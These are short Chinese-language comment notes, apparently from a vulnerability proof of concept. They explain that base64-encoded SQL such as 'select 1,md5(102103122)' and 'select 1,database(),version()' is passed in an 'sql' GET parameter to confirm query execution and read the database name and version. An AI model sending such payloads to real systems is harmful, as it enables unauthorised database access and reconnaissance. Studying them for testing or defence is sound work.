#备注说明：
#1.这是个get请求，可以直接用浏览器访问，建议使用火狐浏览器访问，chrome的安全级别高可能打不开加密链接。
#2.sql=c2VsZWN0IDEsbWQ1KDEwMjEwMzEyMik=是计算102103122的DM5值,即：select 1,md5(102103122),sql=c2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCk=是sql#语句使用base64加密后的内容，原文：sql=select 1,database(),version()